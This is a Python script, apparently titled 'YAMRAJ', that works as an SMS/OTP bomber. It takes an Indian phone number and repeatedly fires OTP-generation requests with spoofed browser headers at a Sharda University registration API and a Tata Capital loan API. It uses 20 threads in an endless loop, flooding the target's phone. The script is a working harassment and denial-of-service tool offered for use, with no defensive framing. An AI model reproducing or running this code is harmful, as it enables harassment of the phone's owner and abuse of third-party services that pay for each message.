import requests
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore

RED = Fore.RED
GREEN = Fore.GREEN
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW
Y = Fore.YELLOW
C = Fore.CYAN
G = Fore.GREEN

def check_connection():
    try:
         requests.get("https://www.namecheap.com/visual/font-generator/checkmarks/")
         pass
    except:
        print(f"{RED}[-] {CYAN}No Internet connection !")
        sys.exit(0)
check_connection()

#ascii art
print(f"""
{RED}
██  ██ ▄████▄ ██▄  ▄██ █████▄  ▄████▄    ██
 ▀██▀  ██▄▄██ ██ ▀▀ ██ ██▄▄██▄ ██▄▄██    ██
  ██   ██  ██ ██    ██ ██   ██ ██  ██ ████▀
{CYAN}──────────────────────────────────────────
{GREEN}                v0.0.2
""")
print(f"""{C}
+----------------------------------+
| {Y}Author    : {G}Basant{C}               |
| {Y}Instagram : {G}psychobasant{C}         |
+----------------------------------+
""")

target = input(f"{RED}[-] {CYAN}Enter a number without (+91) {Y}:{G}")

url4 = "https://aweblms.sharda.ac.in/student-panel/api/common/sendRegOtp?utm_source=SU_Website&utm_medium=Header_Ticker&utm_campaign=SU_Admissions_2024"
headers4 = {
    "Host": "aweblms.sharda.ac.in",
    "Content-Length": "1561",
    "Sec-Ch-Ua": '"Chromium";v="127", "Not)A;Brand";v="99"',
    "Accept": "application/json, text/plain, */*",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "en-US",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryjTEgb3aizAIl76Ke",
    "Origin": "https://medical.sharda.ac.in",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://medical.sharda.ac.in/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}
def sharda(target):
    data = (
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="name"\r\n\r\n'
        'Your Name Here\r\n'  # Replace with the actual name
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="email"\r\n\r\n'
        'ehjehj@gmail.com\r\n'
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="mob"\r\n\r\n'
        f'{target}\r\n'
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="state_id"\r\n\r\n'
        'State ID Here\r\n'  # Replace with the actual state ID
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke\r\n'
        f'Content-Disposition: form-data; name="plan_id"\r\n\r\n'
        'Plan ID Here\r\n'  # Replace with the actual plan ID
        '------WebKitFormBoundaryjTEgb3aizAIl76Ke--\r\n'
    )
    try:
        response = requests.post(url4, headers=headers4, data=data)
        # print(f"Sharda API response: {response.text}")  # Log the response text
        if response.status_code == 200:
            print(f"{GREEN}[✔] {CYAN}otp sent")
        else:
            print(f"{RED}[✗] {CYAN}Rate limit!")
    except:
        print(f"{RED}[✗] {CYAN}Error!")
# sharda(target)

def tatacar(target):
    url = "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp"

    headers = {
        "Host": "hlonline.tatacapital.com",
        "Content-Length": "156",
        "Sec-Ch-Ua-Platform": "\"Linux\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"130\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Origin": "https://www.tatacapital.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.tatacapital.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i",
    }

    data = {
        "mobileNumber": target,
        "isNew": 1,
        "deviceOs": "web",
        "sourceName": "Bing_Search",
        "subSourceName": None,
        "webOsCapture": "Linux x86_64",
        "deviceCapture": "Web"
    }

    try:
        response = requests.post(url, headers=headers, json=data)
        print(f"{GREEN}[✔] {CYAN}otp sent")
    except:
        print(f"{RED}[✗] {CYAN}Error!")
# tatacar(target)
def main():
    tp = ThreadPoolExecutor(max_workers=20) #can fuck device less than 3GB RAM
    stopped = False
    try:
        while True:
            tp.submit(sharda, target)
            tp.submit(tatacar, target)
            time.sleep(0.01)

    except KeyboardInterrupt:
        if not stopped:
            stopped = True
            print("Stopping...")
            tp.shutdown(wait=False, cancel_futures=True)
            sys.exit(0)

if __name__ == "__main__":
    main()
    
